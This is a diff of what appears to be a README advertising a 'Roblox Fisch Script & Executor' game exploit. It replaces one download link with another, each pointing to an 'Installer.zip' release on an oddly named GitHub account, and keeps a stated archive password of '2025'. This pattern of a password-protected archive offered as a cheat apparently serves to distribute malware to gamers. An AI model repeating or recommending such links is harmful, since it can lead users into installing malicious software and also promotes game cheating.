@@ -1,5 +1,5 @@
-# [DOWNLOAD LINK](https://github.com/Instlalerzv/installz/releases/download/install/Installer.zip)
-# PASSWORD : 2025
+# [DOWNLOAD LINK](https://github.com/bow-coverbang/installerz/releases/download/install/Installer.zip) 
+ # PASSWORD : 2025 
 
 # Roblox Fisch Script 🚀 Roblox Fisch Script & Executor 🚀 Roblox Fisch Script Powerful Exploit
 
